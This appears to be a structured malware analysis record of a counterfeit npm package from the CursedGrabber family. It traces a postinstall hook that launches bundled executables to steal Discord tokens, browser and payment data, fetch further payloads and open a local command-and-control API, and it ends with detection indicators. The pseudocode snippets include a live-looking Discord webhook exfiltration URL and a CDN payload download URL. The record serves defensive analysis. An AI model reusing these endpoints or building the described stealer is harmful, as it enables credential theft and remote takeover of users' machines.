package_info.why_malicious: The package is a counterfeit npm component that, upon installation, executes bundled Windows executables designed to steal Discord tokens, browser data, payment information, and establish a backdoor for remote control. It is part of the CursedGrabber malware family, specifically targeting Windows users for credential and data theft, and further malware delivery.

malicious_snippets.code_behavior: During installation, the postinstall script triggers execution of the main JavaScript file (lib.js), which in turn launches malicious executables.

malice_analysis.why_suspicious: Postinstall scripts are often abused to execute malicious payloads automatically upon package installation.
malice_analysis.violated_expectations: Legitimate packages rarely require postinstall scripts that execute binaries unrelated to package functionality.
malice_analysis.similar_legitimate_use: Some legitimate packages use postinstall for setup or compilation, but not for launching unrelated executables.

malicious_snippets.code_behavior: During installation, the code executes two bundled Windows executables (lib.exe and lib2.exe) using Node.js child_process.

malice_analysis.why_suspicious: Executing arbitrary binaries during installation is a classic malware technique to bypass user scrutiny and security controls.
malice_analysis.violated_expectations: Node.js packages should not execute unknown Windows binaries as part of their installation.
malice_analysis.similar_legitimate_use: Rarely, developer tools may invoke platform-specific binaries, but not in this context.
key_indicators: No legitimate reason for Windows binary execution in a cross-platform package

malicious_snippets.code_snippet:
// C# pseudocode
Read Discord leveldb files and browser profiles
Extract Discord tokens and payment info
Send data to https://discordapp.com/api/webhooks/769943162193707098/jacVRUcz9zBrsstbdIzhzGoRCvfbz3J9BOk8bV5UA_DpUKMtEW3KULQA2q2mBMqjmmsh
malicious_snippets.code_behavior: At runtime, the executable reads browser and Discord data, extracts tokens and payment information, and exfiltrates them via a Discord webhook.

malice_analysis.why_suspicious: Accessing and exfiltrating sensitive user data (tokens, payment info) is a hallmark of credential-stealing malware.
malice_analysis.violated_expectations: Legitimate software should not access or transmit user credentials or payment data without consent.
malice_analysis.similar_legitimate_use: Security tools may scan for tokens locally, but never exfiltrate them.
key_indicators: Access to Discord and browser data

malicious_snippets.code_snippet:
// C# pseudocode
Download ZIP from https://cdn.discordapp.com/attachments/761673865285337119/776740716524601374/bundle-5.0.5.zip
Unzip to temp directory
Execute osloader.exe and winresume.exe
malicious_snippets.code_behavior: At runtime, the executable downloads a ZIP archive from a Discord CDN, extracts it, and executes additional malicious binaries.

malice_analysis.why_suspicious: Downloading and executing further payloads is a common dropper technique to extend malware capabilities.
malice_analysis.violated_expectations: Legitimate software should not download and execute arbitrary binaries from remote sources.
malice_analysis.similar_legitimate_use: Auto-updaters may download signed updates, but not from Discord CDN or without user consent.

malicious_snippets.code_behavior: At runtime, the binary launches winresume.exe and performs advanced malicious actions including privilege escalation, keylogging, screenshot capture, webcam access, and backdoor installation.

malice_analysis.why_suspicious: Combining multiple advanced attack techniques in a single binary is characteristic of sophisticated malware.
malice_analysis.violated_expectations: Legitimate binaries do not perform privilege escalation, keylogging, or install backdoors.

malicious_snippets.code_behavior: At runtime, the binary throws a fake error message to mislead users and evade detection by security tools.

malice_analysis.why_suspicious: Fake error messages are used to deceive users and security analysts, allowing malware to operate undetected.
malice_analysis.violated_expectations: Legitimate software does not intentionally mislead users about compatibility.

malicious_snippets.code_snippet:
private static readonly string APIHost = "http://localhost:20202/api/";
// REST API for C2
malicious_snippets.code_behavior: At runtime, the DLL exposes a REST API on port 20202, enabling remote command-and-control access to the infected machine.

malice_analysis.why_suspicious: Exposing a local REST API for C2 is a stealthy method for attackers to control compromised systems.
malice_analysis.violated_expectations: Legitimate software does not open undocumented local APIs for remote control.
key_indicators: Local REST API on high port

attack_chain.action: User installs the xpc.js npm package, triggering the postinstall script.
lib.js executes bundled Windows binaries lib.exe and lib2.exe.
lib.exe steals Discord tokens, browser data, and payment information, exfiltrating them via Discord webhook.
lib2.exe downloads a malicious ZIP archive from Discord CDN, extracts it, and executes osloader.exe and winresume.exe.
osloader.exe performs privilege escalation, keylogging, screenshot capture, webcam access, and installs a backdoor.
winresume.exe displays a fake error message to mislead users and evade detection.
BackdoorApi.dll exposes a REST API on port 20202 for attacker C2 access.
attack_chain.leads_to: Attacker can remotely control the infected system

behavioral_signatures: npm package with postinstall script executing local or bundled EXE files
Node.js child_process execution of Windows binaries
EXE files accessing Discord/browser data and exfiltrating via webhooks
Download and execution of additional payloads from Discord CDN
Creation of local REST API on high-numbered ports (e.g., 20202)
Fake error messages about OS compatibility
file_indicators: Bundled binaries: lib.exe, lib2.exe, osloader.exe, winresume.exe
detection_knowledge.how_to_detect: Monitor npm package installations for postinstall scripts that execute binaries, especially on Windows. Flag packages containing or executing EXE files. Detect network connections to Discord webhooks and Discord CDN for non-standard payload downloads. Watch for processes opening local REST APIs on uncommon ports (e.g., 20202). Alert on binaries that access Discord/browser data or display fake error messages about OS compatibility.
